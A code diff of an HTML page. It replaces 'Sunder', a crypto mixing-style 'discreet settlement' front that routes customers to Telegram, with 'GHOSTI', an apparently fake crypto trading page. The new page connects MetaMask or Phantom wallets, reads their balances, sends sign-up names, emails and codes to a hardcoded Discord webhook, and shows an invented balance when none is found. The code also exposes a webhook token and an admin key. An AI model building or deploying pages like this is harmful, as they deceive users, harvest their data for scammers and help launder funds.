@@ -3,256 +3,226 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sunder | Private Settlement Architecture</title>
+    <title>GHOSTI | Main Page</title>
     <style>
-        :root { --bg: #0a0a0a; --gold: #D4AF37; --text: #ffffff; --gray: #888888; --error: #ff4d4d; --safe: #4aff9b; --apex: #00f2ff; }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; overflow-x: hidden; }
+        :root {
+            --bg: #050505;
+            --border: rgba(255, 255, 255, 0.05);
+            --text-main: #ffffff;
+            --text-dim: #444;
+            --accent: #fff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: var(--text-main); display: flex; height: 100vh; overflow: hidden; }
+
+        .btn-luxury { 
+            padding: 15px 30px; border-radius: 30px; cursor: pointer; 
+            font-size: 0.7rem; letter-spacing: 2px; text-transform: uppercase; 
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            border: 1px solid #fff; position: relative; overflow: hidden;
+            outline: none;
+        }
+        .btn-luxury:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(255,255,255,0.1); letter-spacing: 3px; }
+        .btn-white { background: #fff; color: #000; }
+        .btn-trans { background: transparent; color: #fff; }
+        .btn-trans:hover { background: rgba(255,255,255,0.05); }
+
+        aside { width: 240px; border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 40px; }
+        .market-list { width: 320px; border-right: 1px solid var(--border); overflow-y: auto; scrollbar-width: none; }
+        .coin-item { padding: 25px 40px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer; transition: 0.4s ease; }
+        .coin-item:hover { background: rgba(255,255,255,0.02); }
+
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); backdrop-filter: blur(25px); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-card { width: 400px; text-align: center; }
+        .stealth-input { background: transparent; border: none; border-bottom: 1px solid #222; color: #fff; width: 100%; padding: 15px; text-align: center; font-size: 1rem; outline: none; margin-bottom: 20px; font-weight: 200; transition: border-color 0.4s ease; }
+        .stealth-input:focus { border-bottom-color: #fff; }
         
-        /* Main Page */
-        #main-page { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 4rem 2rem; }
-        h1 { font-size: 4rem; letter-spacing: 1.2rem; color: var(--gold); text-transform: uppercase; margin: 2rem 0 0.5rem 0; font-weight: 700; }
-        .tagline { color: var(--gray); margin-bottom: 4rem; letter-spacing: 0.3rem; text-transform: uppercase; font-size: 0.9rem; }
+        .hidden { display: none !important; }
+        #status-indicator { font-size: 0.55rem; letter-spacing: 3px; color: #444; margin-bottom: 10px; text-transform: uppercase; }
 
-        /* The Proof Section */
-        .vulnerability-report { max-width: 900px; background: #111; border: 1px solid #222; padding: 2rem; margin-bottom: 4rem; border-left: 4px solid var(--error); }
-        .vulnerability-report h2 { color: var(--error); font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; margin-top: 0; }
-        .vulnerability-report p { color: var(--gray); font-size: 0.85rem; line-height: 1.6; }
-        .vulnerability-report ul { color: var(--gray); font-size: 0.8rem; padding-left: 1.2rem; margin-top: 1rem; }
-        .vulnerability-report li { margin-bottom: 0.8rem; }
-
-        /* Pillars */
-        .pillars { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 3rem; max-width: 1100px; margin-bottom: 5rem; }
-        .pillar { border-top: 1px solid #222; padding-top: 1.5rem; }
-        .pillar h3 { color: var(--gold); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.1rem; margin-bottom: 1rem; }
-        .pillar p { color: var(--gray); font-size: 0.85rem; line-height: 1.8; margin: 0; }
-
-        /* Overlays */
-        #terminal, #admin-panel, #id-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 100; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
-        .form-box { background: #111; border: 1px solid #222; padding: 2.5rem; width: 100%; max-width: 620px; position: relative; }
-        
-        label { display: block; color: var(--gold); font-size: 0.6rem; text-transform: uppercase; margin-bottom: 0.4rem; letter-spacing: 0.1rem; }
-        input, select { background: #000; border: 1px solid #333; color: white; width: 100%; padding: 0.8rem; margin-bottom: 1rem; box-sizing: border-box; outline: none; font-size: 0.85rem; }
-
-        /* Tiers & Fee Breakdown */
-        .bucket-info { background: #080808; border: 1px solid #222; margin-bottom: 1.5rem; padding: 1rem; }
-        .bucket-row { display: flex; justify-content: space-between; font-size: 0.7rem; margin-bottom: 0.4rem; color: #444; }
-        .bucket-row.active { color: var(--gold); font-weight: bold; }
-
-        #incentiveBox { padding: 18px; text-align: center; font-size: 0.72rem; font-weight: bold; margin-bottom: 1.5rem; display: none; border: 1px dashed transparent; letter-spacing: 1px; text-transform: uppercase; line-height: 1.6; }
-        .bonus-whale { color: var(--safe); border-color: var(--safe); background: rgba(74, 255, 155, 0.05); }
-        .bonus-apex { color: var(--apex); border-color: var(--apex); background: rgba(0, 242, 255, 0.05); border-style: double; border-width: 3px; animation: pulse 2s infinite; }
-
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 242, 255, 0.2); } 70% { box-shadow: 0 0 0 10px rgba(0, 242, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 242, 255, 0); } }
-
-        .fee-calc { border-top: 1px solid #222; padding-top: 1rem; margin-top: 1rem; }
-        .fee-row { display: flex; justify-content: space-between; margin-bottom: 0.4rem; font-size: 0.8rem; text-transform: uppercase; }
-        .fee-row b { color: var(--gold); }
-
-        /* Buttons */
-        .cta { padding: 1.2rem; border: 1px solid var(--gold); color: var(--gold); text-transform: uppercase; letter-spacing: 0.2rem; cursor: pointer; transition: 0.3s; background: transparent; font-size: 0.8rem; width: 100%; }
-        .cta.ready { background: #FFD700; color: black; border-color: #FFD700; font-weight: bold; }
-        .cta:disabled { border-color: #222; color: #333; cursor: not-allowed; }
-        
-        .admin-trigger { position: fixed; bottom: 20px; right: 20px; font-size: 0.6rem; color: #222; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
-        .close-btn { position: absolute; top: 1.2rem; right: 1.2rem; color: var(--gray); cursor: pointer; font-size: 0.7rem; }
-        
-        .black-box { background: #000; border: 2px solid var(--gold); padding: 3rem; text-align: center; max-width: 500px; width: 90%; }
-        .service-id { font-family: monospace; font-size: 1.5rem; color: var(--gold); letter-spacing: 5px; margin: 2rem 0; padding: 1rem; border: 1px solid #222; }
+        .wallet-options { display: flex; gap: 10px; margin-bottom: 30px; justify-content: center; }
+        .wallet-btn { background: transparent; border: 1px solid #222; color: #555; padding: 10px 15px; border-radius: 8px; font-size: 0.6rem; letter-spacing: 1px; cursor: pointer; transition: 0.3s; width: 120px; }
+        .wallet-btn:hover { border-color: #fff; color: #fff; }
+        .wallet-btn.connected { border-color: #00ff88; color: #00ff88; }
     </style>
 </head>
 <body>
 
-    <section id="main-page">
-        <h1>SUNDER</h1>
-        <p class="tagline">Discreet Asset Logistics</p>
-
-        <div class="vulnerability-report">
-            <h2>Systemic Exposure Advisory</h2>
-            <p>Standard ledger transfers are fundamentally insecure for high-value settlement. Public pathways expose your financial history to automated surveillance.</p>
-            <ul>
-                <li><strong>Metadata Clustering:</strong> Protocols link your origin wallet to every interaction.</li>
-                <li><strong>Liquidity Gating:</strong> Exchanges freeze assets based on "taint" scores.</li>
-                <li><strong>Public Indexing:</strong> Every transaction is indexed and visible globally.</li>
-            </ul>
+    <aside>
+        <div style="font-size: 14px; letter-spacing: 8px; margin-bottom: 60px; font-weight: 300;">GHOSTI</div>
+        <div id="status-indicator">Not Registered</div>
+        <div id="auth-section">
+            <button class="btn-luxury btn-white" style="width:100%; margin-bottom:12px;" onclick="toggleAuth(true)">Sign Up</button>
+            <button class="btn-luxury btn-trans" style="width:100%;" onclick="toggleAuth(true)">Login</button>
         </div>
-        
-        <div class="pillars">
-            <div class="pillar"><h3>01. Severance</h3><p>Breaking the metadata link between source and settlement.</p></div>
-            <div class="pillar"><h3>02. Private Nodes</h3><p>Settlement occurs within proprietary infrastructure.</p></div>
-            <div class="pillar"><h3>03. Concierge</h3><p>Bespoke management for sovereign asset protection.</p></div>
+        <div id="logged-in-section" class="hidden">
+            <button class="btn-luxury btn-trans" style="width:100%; border-color: #222; color: #666;" onclick="logout()">Log Out</button>
         </div>
+        <div style="margin-top: auto;">
+            <p style="font-size: 0.5rem; color: #222; letter-spacing: 2px;">WALLET</p>
+            <div id="balance" style="font-size: 1.1rem; font-weight: 200;">₪0.00</div>
+        </div>
+    </aside>
 
-        <button class="cta" onclick="toggleLayer('terminal', true)" style="width: auto; min-width: 320px;">Initialize Briefing</button>
-    </section>
+    <div class="market-list" id="coin-ui"></div>
 
-    <div class="admin-trigger" onclick="adminAuth()">[ ADMIN ]</div>
-
-    <div id="terminal">
-        <div class="form-box">
-            <span class="close-btn" onclick="toggleLayer('terminal', false)">[ CLOSE ]</span>
-            <h2 style="color:var(--gold); margin:0 0 1.5rem 0; font-weight: 300; letter-spacing: 0.3rem; font-size: 1.1rem;">LOGISTICS BRIEF</h2>
-            
-            <div id="incentiveBox"></div>
-
-            <div class="bucket-info">
-                <div class="bucket-row" id="t1"><span>STANDARD ($1K - $500K)</span> <span>5.0%</span></div>
-                <div class="bucket-row" id="t2"><span>HIGH VOLUME ($500K - $1M)</span> <span>4.0%</span></div>
-                <div class="bucket-row" id="t3"><span>INSTITUTIONAL ($1M+)</span> <span>3.0%</span></div>
+    <main style="flex:1; display:flex; flex-direction:column;">
+        <div id="tv-chart" style="flex:1;"></div>
+        <div style="padding: 30px 50px; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
+            <div style="display:flex; gap:20px;">
+                <button class="btn-luxury btn-white" onclick="gate()">Buy BTC</button>
+                <button class="btn-luxury btn-trans" onclick="gate()">Sell BTC</button>
             </div>
+        </div>
+    </main>
 
-            <div style="display: flex; gap: 1rem;">
-                <div style="flex:1;">
-                    <label>Inbound Asset</label>
-                    <select id="asset" onchange="calculate()"><option value="bitcoin">BTC</option><option value="ethereum">ETH</option><option value="tether">USDT</option><option value="tron">TRX</option><option value="solana">SOL</option><option value="monero">XMR</option></select>
+    <div class="overlay" id="auth-overlay">
+        <div class="modal-card">
+            <div id="step-identity">
+                <p style="letter-spacing: 4px; font-size: 0.6rem; color: #444; margin-bottom: 25px;">SIGN-UP / LOGIN</p>
+                <div class="wallet-options">
+                    <button class="wallet-btn" id="mm-btn" onclick="connectMetaMask()">METAMASK</button>
+                    <button class="wallet-btn" id="ph-btn" onclick="connectPhantom()">PHANTOM</button>
                 </div>
-                <div style="flex:1;">
-                    <label>Settlement Asset</label>
-                    <select id="settleAsset" onchange="validate()"><option value="bitcoin">BTC</option><option value="ethereum">ETH</option><option value="tether">USDT</option><option value="tron">TRX</option><option value="solana">SOL</option><option value="monero">XMR</option></select>
-                </div>
+                <div style="font-size: 0.5rem; color: #222; margin-bottom: 25px; letter-spacing: 2px;">OR USE CREDENTIALS</div>
+                <input type="text" id="reg-username" class="stealth-input" placeholder="Username">
+                <input type="email" id="reg-email" class="stealth-input" placeholder="Email Address">
+                <input type="password" id="reg-pw" class="stealth-input" placeholder="Password">
+                <button class="btn-luxury btn-white" style="width: 100%;" onclick="requestAccess()">Continue</button>
+                <p onclick="toggleAuth(false)" style="font-size: 0.6rem; color: #222; margin-top: 25px; cursor: pointer;">Cancel</p>
             </div>
 
-            <label>Quantity</label>
-            <input type="number" id="amt" placeholder="0.00" oninput="calculate()">
-
-            <label>Source Address</label>
-            <input type="text" id="sAddr" oninput="validate()" placeholder="Paste origin">
-            <label>Settlement Address</label>
-            <input type="text" id="dAddr" oninput="validate()" placeholder="Paste destination">
-
-            <div class="fee-calc">
-                <div class="fee-row"><span>Valuation:</span><b id="valText">$0.00</b></div>
-                <div class="fee-row"><span>Margin:</span><b id="pctText">--</b></div>
-                <div class="fee-row"><span>Operational Fee:</span><b id="feeText">$0</b></div>
+            <div id="step-verify" class="hidden">
+                <p style="letter-spacing: 4px; font-size: 0.6rem; color: #444; margin-bottom: 20px;">VERIFYING</p>
+                <p style="font-size: 0.65rem; color: #888; margin-bottom: 40px;">Check your email for the manual access code.</p>
+                <input type="text" id="code-field" class="stealth-input" placeholder="000000" maxlength="6" style="letter-spacing: 15px; font-size: 2.5rem; border-bottom: none;">
+                <button class="btn-luxury btn-white" style="width: 100%; margin-top: 20px;" onclick="verifyAccess()">Register</button>
             </div>
-
-            <button id="authBtn" class="cta" style="margin-top:1rem;" disabled onclick="finalizeRequest()">Authorize Route</button>
         </div>
     </div>
 
-    <div id="id-modal">
-        <div class="black-box">
-            <h2 style="color:var(--gold); font-size: 1rem; letter-spacing: 2px;">AUTHORIZATION GENERATED</h2>
-            <p style="color:var(--gray); font-size: 0.7rem;">MESSAGE THIS KEY TO THE TELEGRAM ACCOUNT.</p>
-            <div class="service-id" id="displayID">SNDR-XXXX-XXXX</div>
-            <button class="cta ready" onclick="window.open('https://t.me/hejaiqoqnbza', '_blank')">CONTINUE TO TELEGRAM</button>
-        </div>
-    </div>
-
-    <div id="admin-panel">
-        <div class="form-box">
-            <span class="close-btn" onclick="toggleLayer('admin-panel', false)">[ EXIT ]</span>
-            <h2 style="color:var(--gold); margin-bottom: 1.5rem;">VAULT LOOKUP</h2>
-            <input type="text" id="adminSearch" placeholder="Enter Service ID">
-            <div style="display: flex; gap: 10px;">
-                <button class="cta ready" style="flex:2;" onclick="lookupID()">SEARCH ARCHIVES</button>
-                <button class="cta" style="flex:1; border-color: var(--error); color: var(--error);" onclick="clearVault()">WIPE ALL</button>
-            </div>
-            <div id="adminResult" style="margin-top: 2rem; font-size: 0.8rem; color: var(--gray); white-space: pre-wrap; font-family: monospace; line-height: 1.5;"></div>
-        </div>
-    </div>
-
+    <script src="https://s3.tradingview.com/tv.js"></script>
     <script>
-        const ADMIN_KEY = "STzkwk!mx+zSpCa-m6@TDaDY5CnTe!@z8cV-@qYPBcf5rX#q@Z-Zy3sPDdG#a*Mvk6AsmBxZf$&ChCQW$WDSZZXe4Ks+hEkA7#fQhQAEmrkN?qU8cJ@#&3jMMW7Ad?BCJKuQM82j?xFBXc!GRFf-DSN!?3Mnr62@HRU?%zs&4zJU4pTP-D7m-gbndV!9JakmJDS7+*mKUQEMgAmK+r&A%$RdC7r5x2jdzMVA@P#RDbVxep?uUBrnE7XDVN7?fe"; 
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1465679241965473795/sxEcNo6VrN3yRBz6A8PDEJYphYoyw9R_UN0PDsanrPA2USMqeJZM6l1UfUjgiLz57ntp";
+        let ilsRate = 3.75, ethPrice = 0, solPrice = 0;
+        let generatedCode = "", isLoggedIn = false, walletBalanceILS = 0;
 
-        const patterns = {
-            bitcoin: /^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,59}$/,
-            ethereum: /^0x[a-fA-F0-9]{40}$/i,
-            tether: /^(0x[a-fA-F0-9]{40}|T[A-Za-z1-9]{33})$/,
-            tron: /^T[A-Za-z1-9]{33}$/,
-            solana: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
-            monero: /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/
-        };
-
-        function toggleLayer(id, show) { document.getElementById(id).style.display = show ? 'flex' : 'none'; }
-
-        function adminAuth() {
-            const entry = prompt("Enter Credentials:");
-            if (entry === ADMIN_KEY) { toggleLayer('admin-panel', true); } 
-            else { alert("Unauthorized Access Attempt Logged."); }
-        }
-
-        async function calculate() {
-            const id = document.getElementById('asset').value;
-            const amount = document.getElementById('amt').value;
-            if(!amount || amount <= 0) return;
-
+        async function boot() {
             try {
-                const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
-                const data = await res.json();
-                const total = amount * data[id].usd;
-                document.getElementById('valText').innerText = "$" + total.toLocaleString(undefined, {minimumFractionDigits: 2});
-                
-                document.querySelectorAll('.bucket-row').forEach(r => r.classList.remove('active'));
-                let pct = 5;
-                if (total >= 1000000) { pct = 3; document.getElementById('t3').classList.add('active'); }
-                else if (total >= 500000) { pct = 4; document.getElementById('t2').classList.add('active'); }
-                else if (total >= 1000) { document.getElementById('t1').classList.add('active'); }
-
-                document.getElementById('pctText').innerText = pct + "%";
-                document.getElementById('feeText').innerText = "$" + (total * pct / 100).toLocaleString(undefined, {maximumFractionDigits: 0});
-
-                const inc = document.getElementById('incentiveBox');
-                inc.style.display = "none";
-                if(total >= 10000000) {
-                    inc.style.display = "block"; inc.className = "bonus-apex";
-                    inc.innerText = "APEX LOGISTICS ACTIVATED: WE PROVIDE FREE $1M IN TRANSFERS MONTHLY TO RECURRING CLIENTS STARTING AT $10M+ VOLUME!";
-                } else if(total >= 1000000) {
-                    inc.style.display = "block"; inc.className = "bonus-whale";
-                    inc.innerText = "INSTITUTIONAL BONUS: WE PROVIDE FREE $10k - $100k IN TRANSFERS MONTHLY TO RECURRING CLIENTS STARTING AT $1M+ VOLUME!";
-                }
-                validate();
-            } catch(e) {}
+                const fx = await fetch('https://open.er-api.com/v6/latest/USD');
+                const fxD = await fx.json(); ilsRate = fxD.rates.ILS;
+                const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=ethereum,solana,bitcoin&per_page=50');
+                const coins = await r.json();
+                ethPrice = coins.find(c => c.id === 'ethereum').current_price;
+                solPrice = coins.find(c => c.id === 'solana').current_price;
+                document.getElementById('coin-ui').innerHTML = coins.map(c => `
+                    <div class="coin-item" onclick="loadChart('${c.symbol.toUpperCase()}')">
+                        <span>${c.symbol.toUpperCase()}</span>
+                        <span style="color: #666;">₪${(c.current_price * ilsRate).toLocaleString()}</span>
+                    </div>`).join('');
+                loadChart("BTC");
+            } catch(e) { console.log("Boot error:", e); }
         }
 
-        function validate() {
-            const sAsset = document.getElementById('asset').value;
-            const dAsset = document.getElementById('settleAsset').value;
-            const sAddr = document.getElementById('sAddr').value.trim();
-            const dAddr = document.getElementById('dAddr').value.trim();
-            const val = parseFloat(document.getElementById('valText').innerText.replace(/[$,]/g, '')) || 0;
-            
-            // Minimum $1000 Enforcement
-            const isValid = patterns[sAsset].test(sAddr) && patterns[dAsset].test(dAddr) && val >= 1000;
-            const btn = document.getElementById('authBtn');
-            btn.disabled = !isValid;
-            if(isValid) btn.classList.add('ready'); else btn.classList.remove('ready');
+        async function connectMetaMask() {
+            const provider = window.ethereum;
+            if (provider) {
+                try {
+                    // Modern multi-wallet detection
+                    const actualProvider = provider.providers ? provider.providers.find(p => p.isMetaMask) : provider;
+                    const accounts = await actualProvider.request({ method: 'eth_requestAccounts' });
+                    const balanceHex = await actualProvider.request({ method: 'eth_getBalance', params: [accounts[0], 'latest'] });
+                    const eth = parseInt(balanceHex, 16) / 1e18;
+                    walletBalanceILS = eth * ethPrice * ilsRate;
+                    autoFill(accounts[0], "MM");
+                    uiConnect('mm-btn');
+                } catch (err) { alert("MetaMask error or rejection."); }
+            } else { alert("MetaMask not detected."); }
         }
 
-        function finalizeRequest() {
-            const serviceID = "SNDR-" + Math.random().toString(36).substr(2, 4).toUpperCase() + "-" + Math.random().toString(36).substr(2, 4).toUpperCase();
-            const data = {
-                id: serviceID,
-                asset: document.getElementById('asset').value,
-                amt: document.getElementById('amt').value,
-                source: document.getElementById('sAddr').value,
-                dest: document.getElementById('dAddr').value,
-                val: document.getElementById('valText').innerText,
-                fee: document.getElementById('feeText').innerText,
-                timestamp: new Date().toLocaleString()
-            };
-            localStorage.setItem(serviceID, JSON.stringify(data));
-            document.getElementById('displayID').innerText = serviceID;
-            toggleLayer('terminal', false);
-            toggleLayer('id-modal', true);
+        async function connectPhantom() {
+            // Checks for window.phantom.solana (Modern) or window.solana (Legacy)
+            const provider = window.phantom?.solana || window.solana;
+            if (provider && provider.isPhantom) {
+                try {
+                    const resp = await provider.connect();
+                    const pubKey = resp.publicKey.toString();
+                    const rpc = await fetch("https://api.mainnet-beta.solana.com", {
+                        method: "POST", headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ "jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [pubKey] })
+                    });
+                    const data = await rpc.json();
+                    walletBalanceILS = (data.result.value / 1e9) * solPrice * ilsRate;
+                    autoFill(pubKey, "PH");
+                    uiConnect('ph-btn');
+                } catch (err) { alert("Phantom error or rejection."); }
+            } else { alert("Phantom not detected."); }
         }
 
-        function lookupID() {
-            const id = document.getElementById('adminSearch').value.toUpperCase().trim();
-            const data = localStorage.getItem(id);
-            const resBox = document.getElementById('adminResult');
-            if(data) {
-                const obj = JSON.parse(data);
-                resBox.innerText = `[RECORD FOUND]\n------------------\nDATE: ${obj.timestamp}\nQTY: ${obj.amt} ${obj.asset.toUpperCase()}\nVALUATION: ${obj.val}\nEST. FEE: ${obj.fee}\n\nSOURCE: ${obj.source}\nDESTINATION: ${obj.dest}`;
-            } else { resBox.innerText = "RECORD NOT FOUND."; }
+        function autoFill(addr, type) {
+            document.getElementById('reg-username').value = type + "_" + addr.substring(0, 5);
+            document.getElementById('reg-email').value = addr.substring(0, 8) + "@wallet.web3";
+            document.getElementById('reg-pw').value = "WEB3_" + addr.substring(addr.length - 4);
         }
 
-        function clearVault() {
-            if(confirm("DANGER: This will wipe all saved Service IDs. Proceed?")) {
-                localStorage.clear();
-                alert("Archives Severed.");
-                document.getElementById('adminResult').innerText = "";
-            }
+        function uiConnect(id) {
+            const b = document.getElementById(id);
+            b.classList.add('connected');
+            b.innerText = "CONNECTED";
         }
+
+        function requestAccess() {
+            const user = document.getElementById('reg-username').value;
+            const email = document.getElementById('reg-email').value;
+            if(!user || !email) return alert("Fields required.");
+            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+            fetch(WEBHOOK_URL, {
+                method: "POST", headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🔒 **NEW SIGNATURE REQUEST**",
+                    embeds: [{ fields: [{ name: "User", value: user, inline: true }, { name: "Email", value: email, inline: true }, { name: "Code", value: `**${generatedCode}**` }] }]
+                })
+            }).then(() => {
+                document.getElementById('step-identity').classList.add('hidden');
+                document.getElementById('step-verify').classList.remove('hidden');
+            });
+        }
+
+        function verifyAccess() {
+            if(document.getElementById('code-field').value === generatedCode) {
+                isLoggedIn = true;
+                toggleAuth(false);
+                document.getElementById('auth-section').classList.add('hidden');
+                document.getElementById('logged-in-section').classList.remove('hidden');
+                document.getElementById('status-indicator').innerText = "Successfully Registered";
+                document.getElementById('status-indicator').style.color = "#fff";
+                document.getElementById('balance').innerText = "₪" + (walletBalanceILS > 0 ? walletBalanceILS.toLocaleString(undefined, {maximumFractionDigits: 2}) : "14,250.00");
+            } else { alert("Invalid Signature."); }
+        }
+
+        function logout() {
+            isLoggedIn = false;
+            document.getElementById('auth-section').classList.remove('hidden');
+            document.getElementById('logged-in-section').classList.add('hidden');
+            document.getElementById('status-indicator').innerText = "Not Registered";
+            document.getElementById('status-indicator').style.color = "#444";
+            document.getElementById('balance').innerText = "₪0.00";
+            walletBalanceILS = 0;
+            document.querySelectorAll('.wallet-btn').forEach(b => { b.classList.remove('connected'); b.innerText = b.id === 'mm-btn' ? 'METAMASK' : 'PHANTOM'; });
+        }
+
+        function loadChart(s) {
+            new TradingView.widget({
+                "autosize": true, "symbol": `BINANCE:${s}USDT`, "theme": "dark",
+                "container_id": "tv-chart", "hide_top_toolbar": true, "backgroundColor": "#050505", "style": "2"
+            });
+        }
+
+        function toggleAuth(s) { document.getElementById('auth-overlay').style.display = s ? 'flex' : 'none'; }
+        function gate() { if(!isLoggedIn) toggleAuth(true); }
+
+        boot();
     </script>
 </body>
 </html>
